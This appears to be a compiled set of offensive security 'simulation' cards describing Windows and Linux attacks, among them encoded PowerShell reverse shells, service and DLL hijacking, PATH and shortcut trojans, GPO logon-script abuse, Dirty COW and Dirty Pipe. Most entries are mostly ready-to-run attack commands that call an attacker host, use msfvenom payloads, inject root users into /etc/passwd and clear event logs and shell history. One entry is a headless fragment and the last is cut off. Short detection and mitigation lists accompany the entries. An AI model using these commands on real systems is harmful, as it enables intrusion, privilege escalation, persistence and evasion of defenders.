## Reverse Shell via Encoded PowerShell Payload

- **Attack Type**: Remote Code Execution / Shell Access
- **Target**: Windows Workstations / Servers with PowerShell Enabled
- **Vulnerability**: Abuse of PowerShell for Remote Code Execution using Encoded Payload
- **MITRE**: T1059.001 (Command and Scripting Interpreter: PowerShell),T1105 (Ingress Tool Transfer), T1055 (Process Injection – if obfuscated further)
- **Impact**: Full remote shell access to the target system; potential privilege escalation, data exfiltration, or lateral movement
- **Tools**: ✅ Windows 10 VM (Victim), ✅ Kali Linux (Attacker), ✅ Netcat, ✅ Base64 encoder, ✅ PowerShell
- **Scenario**: This simulation demonstrates how an attacker can leverage built-in Windows tools like powershell.exe to establish a reverse shell using an encoded command. Encoding allows the payload to bypass simple input filters and AV detections. This is often used in phishing payloads, web shell post-exploitation, and lateral movement in enterprise Windows environments.
- **Attack Steps**: 🟢 STEP 1: Set Up Listener on Attacker Machine  On Kali Linux (or Parrot OS), open a terminal and run the following command to start a Netcat listener that will catch the reverse shell from the target Windows system:  nc -nlvp 4444  This listens on local port 4444, waiting for incoming TCP connections.🟢 STEP 2: Prepare the PowerShell Reverse Shell Command  Write a simple PowerShell reverse shell that connects back to your attacker machine:  powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback +'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"  🟢 STEP 3: Base64 Encode the Command  To obfuscate and avoid detection, encode the command using PowerShell on your Linux machine (or any Base64 tool):  echo "<the full command above>" | iconv -t UTF-16LE | base64 -w 0  Copy the encoded output for the next step.🟢 STEP 4: Build the Encoded PowerShell Launcher  Now construct a PowerShell payload using the `-EncodedCommand` flag:  powershell -NoP -NonI -W Hidden -EncodedCommand <base64_encoded_string_here>  This bypasses execution restrictions and hides the window. 🟢 STEP 5: Execute on Victim System  You can run this command via CMD prompt, infected Office macro, malicious LNK file, or other delivery mechanisms:  cmd.exe /c powershell -NoP -NonI -W Hidden -EncodedCommand <base64_encoded_string>  Once executed, this opens a reverse shell back to your Kali box. 🟢 STEP 6: Verify Shell on Kali  If all went right, you’ll see a connection on your terminal from the victim. You now have an interactive PowerShell shell. 🟢 STEP 7: (Optional) Maintain Persistence   You may drop a persistent payload in the registry or scheduled task. But for basic shell simulation, this ends here. 🧠 Pro Tip: Always replace 'ATTACKER_IP' with your Kali IP. You can find it using `ip a` or `ifconfig`.  🧠 Encode your payload with UTF-16LE before base64 encoding, or it will fail on Windows.
- **Detection**: - Monitor for PowerShell using EncodedCommand in command-line arguments - Use PowerShell logging (ScriptBlock & Module logging) - SIEM alerting for suspicious Base64 payloads - Detect outbound traffic to unknown IPs on uncommon ports
- **Solution**: - Block PowerShell for standard users via AppLocker or WDAC - Disable PowerShell v2 - Enable PowerShell Constrained Language Mode - Use Endpoint Detection and Response (EDR) solutions- Train users on phishing and suspicious scripts
- **Tags**: #PowerShellExploit #ReverseShell #EncodedCommand #RedTeamTTP #WindowsPersistence #ATTACKT1059 #DetectionReady

## Binary Replacement in Auto-Started Services

- **Attack Type**: Persistence / Privilege Escalation via Service Hijack
- **Target**: Windows Services, Workstations,Legacy enterprise software, 3rd party Windows apps
- **Vulnerability**: Misconfigured service binary path, Writable by non-admin users, Auto-starting with SYSTEM
- **MITRE**: T1574.009 (Hijack Execution Flow: Services File Permissions Weakness)
- **Impact**: SYSTEM-level reverse shell Full OS takeover Persistence across reboots
- **Tools**: ✅ Windows 10 (Target)✅ Kali Linux (Attacker)✅ AccessChk (Sysinternals)✅ Metasploit Framework✅ msfvenom✅ PowerShell✅ Command Prompt
- **Scenario**: In this scenario, an attacker abuses weak permissions on a Windows service binary path. If the service is set to auto-start and its executable path is writable by non-admin users, an attacker can replace the binary with a malicious payload. On system boot or manual service start, the malicious binary runs with elevated (SYSTEM) privileges. This attack is useful for persistence and privilege escalation.
- **Attack Steps**: ### 🟢 STEP 1: Identify Vulnerable Auto-Started Services Use this command:`wmic service get name,displayname,pathname,startmode	findstr /i "Auto"<br><br>You're looking for:<br>✅ Services that start **automatically**<br>✅ Path points to an **.exe file in a writable folder** (like C:\Program Files\App\app.exeorC:\Users\Public)<br><br>---<br>### 🟢 STEP 2: Check Permissions on Binary/Path<br>Run:<br>icacls "C:\Program Files\App\app.exe"<br><br>Or use:<br>accesschk.exe -uws "Users" "C:\Program Files\App"<br><br>✅ If you find **(M) Modify** or **(W) Write** permissions for Users group – it’s vulnerable<br><br>---<br>### 🟢 STEP 3: Replace Binary with Malicious One<br>Create a reverse shell payload:<br>msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your IP> LPORT=4444 -f exe -o shell.exe<br><br>Stop the legit service:<br>sc stop AppService<br><br>Backup original binary:<br>copy app.exe app_backup.exe<br><br>Replace it:<br>copy shell.exe app.exe<br><br>---<br>### 🟢 STEP 4: Setup Listener on Attacker Machine<br>In Kali:<br>nc -nlvp 4444<br><br>---<br>### 🟢 STEP 5: Restart Service or Reboot<br>Restart the service:<br>sc start AppService<br>✅ Reverse shell triggered with SYSTEM privileges<br><br>OR reboot the system<br><br>---<br>### 🟢 STEP 6: Confirm Privilege Escalation<br>In shell, check whoami:<br>whoami→ Should returnNT AUTHORITY\SYSTEM`--### 🟢 STEP 7: Persistence (Optional) Replace again with stealthier binary, use rundll32 persistence or re-register service --- ### 🛑 STEP 8: Cleanup • Replace original binary back • Restart service • Clear logs (Event Viewer, Procmon if used) • Remove shell artifacts🧠 Tip: This technique often works on apps installed with custom installers that leave behind writable paths
- **Detection**: - Monitor file changes in service binary locations - Use tools like Sysmon - Procmon can detect binary tampering - Event Viewer logs 7036 (service start/stop)
- **Solution**: - Enforce NTFS permissions - Remove write access for Users - Use icacls to audit paths - Monitor services that run as SYSTEM - Use AppLocker or WDAC to block unsigned binaries
- **Tags**: #BinaryHijack #WindowsPrivilegeEscalation #ServiceExploitation #AutoStartExploit #RedTeam #MisconfiguredPermissions #Sysinternals #PayloadReplace

## DLL Hijacking in Writable Folders

- **Attack Type**: Privilege Escalation / Code Execution
- **Target**: Desktop appsSigned software3rd-party servicesInstaller packagesSystem utilities
- **Vulnerability**: DLL Search Order HijackWritable folder for standard userMissing or relative DLL path loading
- **MITRE**: T1574.001 (Hijack Execution Flow: DLL Search Order Hijacking)T1055.001 (Process Injection via DLL)
- **Impact**: Reverse shell with elevated privilegesPersistence via auto-runBypassing AppLocker (if DLL is unsigned)
- **Tools**: ✅ Kali Linux (Attacker)✅ Windows VM (Victim)✅ Process Monitor (Sysinternals)✅ CFF Explorer or Dependency Walker✅ Metasploit / msfvenom✅ AccessChk.exe✅ DLL template code (C++)✅ PowerShell / Command Prompt
- **Scenario**: This simulation shows how attackers exploit applications that load DLL files from directories with weak permissions. If a user can place a malicious DLL in a writable folder and the application loads DLLs by relative path (without full path hardcoded), the attacker’s DLL can get executed automatically when the app or service runs. This technique abuses DLL search order behavior in Windows.
- **Attack Steps**: ### 🟢 STEP 1: Find a Target ApplicationLook for apps that:• Run with high privileges (Admin/SYSTEM)• Load external DLLs• Are located in a folder writable by user✅ Example: C:\Program Files\AppFolder\App.exeUse:accesschk.exe -w "C:\Program Files\AppFolder"✅ If you have write access — it's vulnerable---### 🟢 STEP 2: Identify Missing DLLRun app with Procmon:1. Filter by process name (App.exe)2. Look for “NAME NOT FOUND” entries for .dll files✅ These show DLLs the app looks for but cannot find (ideal for hijack)---### 🟢 STEP 3: Analyze App's DLL DependencyUse CFF Explorer or Dependency Walker on App.exe• Check which DLLs it tries to load• Look for custom DLLs or unsigned ones---### 🟢 STEP 4: Create Malicious DLLOption A: Using msfvenommsfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker IP> LPORT=4444 -f dll -o evil.dllOption B: Write a basic C++ DLL:cpp<br>#include <windows.h><br>BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason, LPVOID lpReserved) {<br> system("powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<IP>/rev.ps1')");<br> return TRUE;<br>}<br>Compile with MinGW or Visual Studio---### 🟢 STEP 5: Place DLL in Writable Folder1. Rename DLL to match missing one (example.dll)2. Copy into folder:copy evil.dll "C:\Program Files\AppFolder\example.dll"---### 🟢 STEP 6: Execute AppStart the vulnerable App:App.exe✅ DLL is loaded and executed✅ You receive reverse shell as SYSTEM or Admin (depending on how app runs)---### 🟢 STEP 7: Setup Listener (Attacker side)nc -nlvp 4444Check received connection---### 🛑 STEP 8: Cleanup• Remove the malicious DLL• Restore original DLL if needed• Clear logs if necessary• Reboot system or restart the service🧠 Tip: DLL hijack is highly stealthy, especially when the app runs at boot or with scheduled task
- **Detection**: - Use Process Monitor to detect DLL loading anomalies- Check Event Viewer logs- Monitor file writes to program folders- Enable DLL loading audit policies
- **Solution**: - Restrict folder write permissions- Use full paths in LoadLibrary- Sign all custom DLLs- Enable Safe DLL Search Mode- Use AppLocker to restrict DLL execution
- **Tags**: #DLLHijack #PrivilegeEscalation #WritablePath #DLLSearchOrder #HijackExecutionFlow #RedTeam #MalwareInjection #AppFolderExploit

## Hijack Startup Entries or Scripts

- **Attack Type**: Privilege Escalation / Persistence

- **Tools**: ✅ Windows 10/11 VM (Victim)✅ Kali Linux or another attacker VM✅ Regedit / reg command✅ msfvenom / custom reverse shell✅ Process Monitor✅ Windows Task Scheduler✅ PowerShell / CMD
- **Scenario**: This attack simulates how an attacker can gain persistence or elevated code execution by hijacking startup entries or scripts (like .bat, .vbs, .ps1) that automatically execute at user login or system boot. This commonly involves modifying registry keys, startup folders, scheduled task scripts, or even login initialization files (e.g., init.bat, GPO logon scripts).
- **Attack Steps**: ### 🟢 STEP 1: Identify Auto-Start LocationsFocus on high-impact entries:• Registry Run Keys:HKCU\Software\Microsoft\Windows\CurrentVersion\RunHKLM\Software\Microsoft\Windows\CurrentVersion\Run• Startup Folder:C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup• Scheduled Tasks with scripts• Group Policy logon scriptsUse this command to list current registry entries:reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run---### 🟢 STEP 2: Check File Paths & PermissionsFor each startup entry, find the actual script or binary path:✅ Example:HKLM\..\Run → BackupService → C:\scripts\backup.batRun:icacls "C:\scripts"✅ If Users have (M) or (W) permissions — vulnerable---### 🟢 STEP 3: Replace or Modify the ScriptCreate a malicious payload:msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_IP> LPORT=4444 -f exe -o revshell.exeOr a one-liner PowerShell reverse shell:echo powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker_IP>/rev.ps1')" > backup.batReplace the original script:copy revshell.bat C:\scripts\backup.bat✅ You’ve now hijacked the startup script---### 🟢 STEP 4: Wait for System Reboot or User LoginAs soon as the user logs in or system reboots:✅ Your malicious script gets executed✅ Reverse shell is establishedOn attacker side:nc -nlvp 4444---### 🟢 STEP 5: Confirm Privilege and PersistenceCheck:whoami → if SYSTEM or AdminCheck registry:reg query HKLM\..\Run to confirm your script is still registered---### 🛑 STEP 6: Cleanup• Restore original script• Remove modified registry entry (if changed)reg delete HKLM\..\Run /v BackupService /f• Delete dropped files• Clear Windows logs (optional):wevtutil cl System🧠 Tip: This works best when the target user or service runs with elevated privileges, and script integrity is not validated (no hashes, no code signing).
- **Detection**: - Monitor changes to startup folders and registry Run keys- Enable Sysmon event logs for process creations- Use Windows Defender ATP or Sysinternals Autoruns- Detect unsigned script executions at boot/login
- **Solution**: - Lock down folder/script permissions- Use code signing- Monitor registry keys via Group Policy- Use AppLocker to restrict unapproved script execution
- **Tags**: #StartupHijack #ScriptAbuse #RunKeyExploit #RegistryPersistence #WindowsPersistence #PrivilegeEscalation #RedTeam

## Writable in PATH → Drop Trojan Binary

- **Attack Type**: Privilege Escalation / Execution Hijack
- **Target**: Windows WorkstationsCI/CD pipelinesDeveloper environmentsDomain login scriptsPortable app systems
- **Vulnerability**: Writable folder in PATHNo binary path hardcodingScript uses command name (not full path)
- **MITRE**: T1574.009 (Hijack Execution Flow: Path Interception)T1037 (Boot/Logon Initialization Scripts)
- **Impact**: - Full code execution- Lateral movement- Remote access- Stealthy persistence- Execution under trusted binary name
- **Tools**: ✅ Windows 10/11 VM✅ Kali Linux or Attacker VM✅ PowerShell / cmd✅ AccessChk✅ msfvenom / custom EXE✅ Environment variable viewer (set, $env:PATH)
- **Scenario**: This simulation covers a real-world technique where attackers find writable directories in the system’s %PATH% variable and drop a trojan binary with the same name as a legitimate tool (e.g., python.exe, net.exe, curl.exe). When any user or scheduled process calls that binary name without the full path, Windows uses its path search order — executing the attacker's binary first if it’s in an earlier or equal path. This enables stealthy privilege escalation or persistence, especially when the original binary is trusted by security products.
- **Attack Steps**: ### 🟢 STEP 1: List System PATH VariableIn PowerShell:$env:PATH -split ';'Or in CMD:echo %PATH%✅ This gives all directories searched when a command is run---### 🟢 STEP 2: Identify Writable PATH DirectoriesUse Sysinternals AccessChk:accesschk.exe -w -s "C:\Program Files\AppFolder"OR loop over each PATH folder:powershell<br>foreach ($folder in ($env:PATH -split ';')) { icacls $folder }<br>✅ Look for folders where Users, Authenticated Users, or Everyone has (M) Modify or (W) Write permissions---### 🟢 STEP 3: Choose Target Binary NamePick a common name likely to be executed without path:✅ Examples:• curl.exe• python.exe• net.exe• robocopy.exe---### 🟢 STEP 4: Create Trojan BinaryGenerate reverse shell with msfvenom:msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-IP> LPORT=4444 -f exe -o curl.exeAlternatively, write a custom C++ binary that logs and executes commands silently---### 🟢 STEP 5: Drop Trojan into Writable PATHCopy payload:copy curl.exe "C:\Program Files\Shared Tools\"✅ Now, if any script or tool runs curl without full path, it may call your trojan first---### 🟢 STEP 6: Trigger ExecutionWait for:• User or service to run curl or target binary• Or simulate manually:Start-Process curlOn attacker machine:nc -nlvp 4444✅ Reverse shell received---### 🟢 STEP 7: Persistence (Optional)• Leave trojan binary in PATH• Change file timestamps with Timestomp to mimic original• Add registry Run key to invoke the binary silently at login---### 🛑 STEP 8: Cleanup• Delete trojan from writable folder• Restore legitimate binary if overwritten• Clear logs• Audit PATH environment for anomalies🧠 Tip: This works especially well in portable app environments and poorly configured enterprise scripts that rely on default command calls without full path control
- **Detection**: - Monitor PATH variable for new/writable entries<br- Use AppLocker / WDAC- Detect duplicate binary names in multiple PATHs- Hash check on launched binaries- Use Sysmon for process creation logs
- **Solution**: - Lock down permissions on all PATH folders- Avoid adding writable folders to PATH- Call binaries using full path in all scripts- Monitor environment variable changes via GPO- Implement signed binary enforcement
- **Tags**: #PATHHijack #BinaryDrop #WindowsExploit #PrivilegeEscalation #TrojanExecution #Persistence #ExecutionHijack #AppFolderAbuse

## Persistence via Shortcut Hijack

- **Vulnerability**: Writable .lnk files in user-accessible pathsStartup folder permissionsMissing shortcut signing or validation
- **MITRE**: T1547.009 (Boot or Logon Autostart: Shortcut Modification)T1037 (Boot Initialization Scripts)
- **Impact**: - Stealthy code execution- Persistence across reboots- User-triggered execution- Lateral movement vector- Minimal antivirus detection
- **Tools**: ✅ Windows 10/11 VM (Victim)✅ Kali Linux or other attacker system✅ PowerShell / cmd✅ msfvenom or a reverse shell payload✅ LNK Shortcut editor (e.g., PowerShell, LNK Updater, manual right-click editing)✅ icacls / accesschk
- **Scenario**: This simulation shows how an attacker can achieve stealthy persistence by modifying existing shortcut (.lnk) files — often on the Desktop, Start Menu, or Startup folders. These shortcuts normally point to legitimate programs, but if a shortcut is writable, the attacker can change it to first execute malicious code, and then launch the legitimate app to avoid user suspicion. This method works well in multi-user systems where users trust shortcuts and don’t verify their properties.
- **Attack Steps**: ### 🟢 STEP 1: Discover Writable ShortcutsCommon locations:• C:\Users\Public\Desktop\ → Public desktop• C:\ProgramData\Microsoft\Windows\Start Menu\Programs\• C:\Users\<target>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Run:icacls "C:\Users\Public\Desktop"✅ If Users have (W) or (M) → vulnerable---### 🟢 STEP 2: Identify Legitimate ShortcutExample:C:\Users\Public\Desktop\Notepad.lnk → Points to C:\Windows\System32\notepad.exeRight-click → Properties → View Target path and Start in---### 🟢 STEP 3: Create Malicious PayloadOn attacker machine:msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your_IP> LPORT=4444 -f exe -o payload.exeTransfer payload.exe to victim system (e.g., using SMB, USB, shared folder):C:\Users\Public\payload.exe---### 🟢 STEP 4: Modify the ShortcutReplace shortcut Target with:cmd.exe /c start C:\Users\Public\payload.exe & start C:\Windows\System32\notepad.exeThis chain opens the reverse shell first, then the real app to avoid suspicion.Use PowerShell:powershell<br>$s=(New-Object -COM WScript.Shell).CreateShortcut('C:\Users\Public\Desktop\Notepad.lnk')<br>$s.TargetPath='cmd.exe'<br>$s.Arguments='/c start C:\Users\Public\payload.exe & start C:\Windows\System32\notepad.exe'<br>$s.Save()<br>✅ Now when the user clicks “Notepad” — the malicious code runs first silently.---### 🟢 STEP 5: Setup Listener (Attacker)On Kali:nc -nlvp 4444Wait for user to click the shortcut✅ Reverse shell received---### 🟢 STEP 6: Optional – Drop Shortcut into Startup FolderPersistence without user interaction:copy Notepad.lnk "C:\Users\<target>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"✅ Payload will auto-execute at next login---### 🛑 STEP 7: Cleanup• Restore original shortcut• Delete payload file• Clear shortcut properties• Clean Event Viewer logs if necessary🧠 Tip: Shortcut hijack is very stealthy — the user sees expected behavior, yet your code runs in the background. Can be combined with timestomping for even more stealth.
- **Detection**: - Monitor changes to .lnk files- Check shortcut hashes or signatures- Use Windows Defender’s Controlled Folder Access- Use Sysmon with Event ID 1 + command line filters
- **Solution**: - Lock down Desktop, Startup folder permissions- Disable public Desktop if unused- Prevent COM access to WScript from user accounts- Educate users not to trust shortcut icons blindly
- **Tags**: #ShortcutHijack #Persistence #LNKAttack #WindowsExploit #RedTeam #StartupAbuse #StealthPayload #LateralMovement #UserTrick

## Linux: Abuse of Writable /usr/local/bin/

- **Attack Type**: Privilege Escalation / Execution Hijack
- **Target**: Linux WorkstationsDev serversMulti-user VMsCI/CD Build Systems
- **Vulnerability**: Writable directory in $PATHUnsanitized command executionNo binary path hardcodingUsers run commands by name
- **MITRE**: T1574.009 (Hijack Execution Flow: Path Interception)T1543.003 (Create or Modify System Process: Unix Shell Configuration Modification)
- **Impact**: - Full user or root shell- Stealthy execution- Hijack frequently used binaries- Elevation via cron or scheduled tasks
- **Tools**: ✅ Kali Linux / Attacker VM✅ Ubuntu/Debian VM (Victim)✅ Netcat (nc)✅ Bash / C✅ msfvenom (if payload required)✅ chmod, ls, which, echo, env, nano
- **Scenario**: On misconfigured Linux systems, if a user has write access to /usr/local/bin/, an attacker can place a malicious executable with the same name as a trusted system binary (e.g., ls, nano, git). Since /usr/local/bin/ is usually early in the $PATH, the system may execute the attacker's binary before the real one. This allows attackers to hijack command execution, perform privilege escalation (if triggered by privileged processes), or establish persistence.
- **Attack Steps**: ### 🟢 STEP 1: Check Write Access to /usr/local/binRun:ls -ld /usr/local/bin✅ You’re looking for something like:drwxrwxrwx 2 root root 4096 ... /usr/local/binOR:drwxrwxr-x 2 root users 4096 ...AND you are part of the users group---### 🟢 STEP 2: Find a Common Binary to HijackUse:echo $PATH✅ /usr/local/bin should be early in the listNow find common commands likely used by other users/services:• nano, vim, git, python, curl, ls, scp, etc.Example:which nano → /usr/local/bin/nano (but it’s your hijacked file)---### 🟢 STEP 3: Create a Malicious Replacement#### Option A – Reverse Shell Bash Scriptbash<br>#!/bin/bash<br>bash -i >& /dev/tcp/<your_IP>/4444 0>&1<br>/bin/nano "$@" # Execute real nano after shell<br>Save as nano#### Option B – Compile C Trojanc<br>#include <stdlib.h><br>int main(int argc, char *argv[]) {<br> system("bash -i >& /dev/tcp/<your_IP>/4444 0>&1");<br> execv("/bin/nano", argv);<br> return 0;<br>}<br>Compile:gcc nano.c -o nano---### 🟢 STEP 4: Drop Binary into /usr/local/bincp nano /usr/local/bin/chmod +x /usr/local/bin/nano✅ Now, anytime a user (or cronjob, or sudo script) calls nano, your code runs first---### 🟢 STEP 5: Set Up Reverse Shell ListenerOn attacker machine:nc -nlvp 4444Trigger:nano somefile.txt✅ You receive a shell — same privileges as the user (could be root in cron context!)---### 🟢 STEP 6: Optional – Persist or Escalate• Drop multiple binaries (git, ls, scp)• Use bashrc, cron, or LD_PRELOAD for persistence---### 🛑 STEP 7: Cleanup• Remove your trojan binary:rm /usr/local/bin/nano• Restore original if needed• Clear .bash_history, logs🧠 Tip: This trick works because PATH-based binary search favors /usr/local/bin/. Even privileged users running unqualified commands may trigger it!
- **Detection**: - Monitor and alert on world-writable PATH directories- Use auditd or inotify for file drops in /usr/local/bin- Log all command execution and match binary hashes- Use AppArmor or SELinux
- **Solution**: - Set /usr/local/bin permissions to root:root 755- Remove world/group write bits- Enforce full-path execution in scripts- Monitor cron or PATH abuse- Use signed binaries only where possible
- **Tags**: #LinuxExploit #PATHHijack #WritableBin #PrivilegeEscalation #ReverseShell #BinaryHijack #RedTeamLinux #TrojanDrop

drive:\\domain.local\SYSVOLCheck ACLs:icacls "\\domain\SYSVOL\domain.local\Policies\{GUID}\User\Scripts\Logon"✅ If Authenticated Users or Domain Users have (M) or (W) → vulnerable to hijack---### 🟢 STEP 2: Discover Target GPO in UseOn a domain-joined client:gpresult /R or rsop.mscLook under:Applied Group Policy Objects → e.g., LogonScriptPolicy✅ Identify the actual GPO GUID path that applies to target user or machine---### 🟢 STEP 3: Analyze Existing Logon ScriptNavigate to:\\domain\SYSVOL\domain.local\Policies\{GPO-GUID}\User\Scripts\Logon\script.batOpen the .bat, .vbs, or .ps1 file✅ Often contains mapped drives, printer installs, etc.---### 🟢 STEP 4: Modify Script to Include PayloadGenerate a reverse shell:msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your-IP> LPORT=4444 -f exe -o payload.exeCopy payload to shared location or accessible folder:\\domain\SYSVOL\domain.local\Scripts\payload.exeNow modify script.bat to add:start \\domain\SYSVOL\domain.local\Scripts\payload.exeOr for PowerShell:powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker-IP>/shell.ps1')"✅ Ensure original functionality is preserved to avoid suspicion---### 🟢 STEP 5: Wait for Target User LoginSetup listener:nc -nlvp 4444When user logs in (or system reboots for Startup GPO), script runs → shell triggered✅ If applied to many users or to privileged OUs (Admins), attacker gains domain-wide access---### 🟢 STEP 6: Confirm PersistenceReboot client machine or wait for daily GPO refreshgpupdate /force✅ Observe if shell triggers againModify script to silently pull payload every login (stealth persistence)---### 🛑 STEP 7: Cleanup• Restore original script• Remove backdoor EXE or PowerShell reference• Reset ACLs with icacls• Clear event logs (Event Viewer → Security, Sysmon)🧠 Tips:• Combine with file timestamp spoofing (Timestomp)• Use UNC path or encoded payload for stealth• Attacks can be silent for months unless auditing is strong
- **Detection**: - Enable auditing on SYSVOL- Monitor file changes to GPO script folders- Use Sysmon Event ID 1 + command line filters- Enable GPO change alerts in SIEM- Check login behavior for anomalies
- **Solution**: - Lock down GPO script folder ACLs- Only allow Domain Admins to edit scripts- Use signed PowerShell scripts- Avoid using login/startup scripts if not needed- Regularly review SYSVOL for unauthorized changes

## Dirty COW – Copy-on-Write Exploit

- **Attack Type**: Local Privilege Escalation
- **Target**: Linux Desktop and Server systemsVPS and shared-hosting serversContainers sharing kernelCloud VMs with unprivileged user access
- **Vulnerability**: Race condition in copy-on-write (COW) memory mappingAllowed unprivileged memory overwrite via madvise()
- **MITRE**: T1068 (Exploitation for Privilege Escalation)T1203 (Exploitation for Client Execution)
- **Impact**: - Full root access from normal user- Total system takeover- Can be automated or persistent- Works even without sudo- Stealthy in many logging environments
- **Tools**: ✅ Vulnerable Linux distro (Ubuntu 16.04 / Debian 8)✅ Dirty COW exploit source code (dirtycow.c, dcow.c, etc.)✅ GCC compiler (gcc)✅ A normal non-root user shell✅ Optional: Netcat or listener for reverse shell✅ Commands: uname, whoami, gcc, id, cat
- **Scenario**: Dirty COW (CVE-2016-5195) is a well-known Linux kernel vulnerability that allows an unprivileged local attacker to escalate privileges to root by exploiting a race condition in the copy-on-write (COW) mechanism of memory management. This attack allows overwriting of read-only memory mappings, such as /etc/passwd, by exploiting madvise() and ptrace or threads, without proper permissions. This simulation walks through a controlled lab scenario to demonstrate full exploitation on a vulnerable Linux kernel (e.g., 2.6.22 - 3.x/4.x), showing how a normal user can gain full root shell.
- **Attack Steps**: ### 🟢 STEP 1: Check if System is VulnerableRun:uname -r✅ Vulnerable versions: 2.6.22 ≤ kernel ≤ 4.8.3 (unpatched)---### 🟢 STEP 2: Confirm You're a Low-Privileged Userwhoami✅ Should return a regular user (not root)---### 🟢 STEP 3: Download Dirty COW ExploitOn the target system:wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c -O dirty.cOther versions:• dcow.c (edits /etc/passwd)• cowroot.c (spawns shell)---### 🟢 STEP 4: Compile the Exploitgcc dirty.c -o dirty -pthreadIf errors, try:gcc -Wall -o cow cow.c -l pthread---### 🟢 STEP 5: Execute the ExploitSome versions create a new root user; others overwrite /etc/passwdRun:./dirty✅ Exploit runs in loop — using race condition with madvise() to overwrite protected memoryExample dcow payload:\nroot2:x:0:0:root:/root:/bin/bash\nInjected into /etc/passwd---### 🟢 STEP 6: Switch to RootIf exploit succeeded:su root2Password: <blank> (or what you injected)id → should return uid=0(root)✅ You now have a full root shell on the machine---### 🟢 STEP 7: Cleanup (Very Important)• Restore original /etc/passwd if backup made• Delete exploit files: rm dirty dirty.c• Exit root shell• Clear bash history: history -c && exit🧠 Tip: You can also modify sudoers, install backdoors, or add root cronjobs if you want persistence — but this is not recommended in production or legal systems
- **Detection**: - Kernel-level logging for memory violations (rare)- Tripwire to monitor /etc/passwd or /etc/shadow changes- Check auditd logs for unusual privilege changes- Use Sysmon for Linux to monitor execution flow
- **Solution**: - Patch kernel immediately (apt upgrade, yum update)- Set /etc as read-only (if immutable system)- Use LSMs like AppArmor or SELinux- Monitor system file changes- Do not allow shell access to unknown users
- **Tags**: #DirtyCOW #CVE20165195 #LinuxPrivilegeEscalation #COWExploit #RaceCondition #RootExploit #RedTeamLinux #MemoryCorruption

## Dirty Pipe – Overwrite Read-Only Files

- **Attack Type**: Local Privilege Escalation / File Tampering
- **Target**: Linux desktopsCloud VPSWeb hosting serversCI/CD containersDeveloper environments
- **Vulnerability**: Linux Kernel Pipe Buffer Flag Mishandling (CVE-2022-0847)Write to read-only filesBypass traditional access controls
- **MITRE**: T1068 (Exploitation for Privilege Escalation)T1222.001 (File and Directory Permissions Modification)T1546.001 (System Binary Proxy Execution)

- **Tools**: ✅ Vulnerable Linux machine (kernel 5.8–5.16.11)✅ gcc✅ Precompiled Dirty Pipe exploit code (e.g., dirtypipe.c)✅ Bash and terminal access as unprivileged user✅ wget, curl, whoami, gcc, su, cat
- **Scenario**: Dirty Pipe (CVE-2022-0847) is a severe Linux kernel vulnerability that allows local users to overwrite read-only or root-owned files, even without having write permissions. It leverages a flaw in the Linux pipe buffer flag handling, allowing attackers to inject data into files like /etc/passwd or system binaries, gaining root shell. This is similar to Dirty COW but more powerful on newer kernels (5.8–5.16.11). This simulation shows a step-by-step lab to escalate privileges by editing /etc/passwd to add a root-level user.
- **Attack Steps**: ### 🟢 STEP 1: Verify Vulnerable KernelRun:uname -r✅ Vulnerable versions: 5.8.0 – 5.16.11, 5.15.25, 5.10.102Check:whoami → you must be a regular user (not root)---### 🟢 STEP 2: Download Dirty Pipe Exploit Source CodeUse known working PoC (e.g., Max Kellermann's exploit):wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/dirtypipe.cOther working variants also available:• dirtypipe_passwd.c → injects new root user• pipe_reader.c → safer PoC---### 🟢 STEP 3: Compile the Exploitgcc dirtypipe.c -o dirtypipeIf successful, a binary named dirtypipe will be created---### 🟢 STEP 4: Identify Target File to OverwriteWe’ll overwrite /etc/passwd to insert a new root user:echo "root2::0:0:root:/root:/bin/bash" >> dummy.txtUse exploit to inject it into /etc/passwd at the correct offsetFind offset:grep -b "root" /etc/passwd → use byte offset of last entry (e.g., 1045)---### 🟢 STEP 5: Run the ExploitExample usage:./dirtypipe /etc/passwd "root2::0:0:root:/root:/bin/bash\n"This injects the malicious line directly into /etc/passwd even though it's read-only---### 🟢 STEP 6: Switch to New Root Usersu root2✅ You now have root access with no passwordRun id → should return uid=0(root)---### 🟢 STEP 7: Cleanup• Restore original /etc/passwd if backup exists (usually exploit creates one)• Delete compiled exploit: rm dirtypipe dirtypipe.c• history -c to clear logs• exit from root shell🧠 Tips:• Attack does not change file permissions (stealthy)• No need for sudo or suid• Works even with noexec partitions
- **Detection**: - Monitor for unauthorized changes to /etc/passwd or /etc/shadow- Audit file integrity using Tripwire or AIDE- Review kernel logs for memory anomalies (though stealthy)- Use Sysmon for Linux or auditd rules- Run vulnerability scanners (Nessus, OpenVAS)
- **Solution**: - Apply kernel patches (5.16.11+)- Update via apt update && apt upgrade- Use grsecurity or SELinux policies- Restrict shell access- Monitor sensitive file integrity using tools like aide
- **Tags**: #DirtyPipe #CVE20220847 #LinuxKernelExploit #PrivilegeEscalation #RootExploit #RedTeamLinux #PipeAbuse #ReadOnlyBypass

## OverlayFS Exploit (CVE-2021-3493)

- **Attack Type**: Local Privilege Escalation
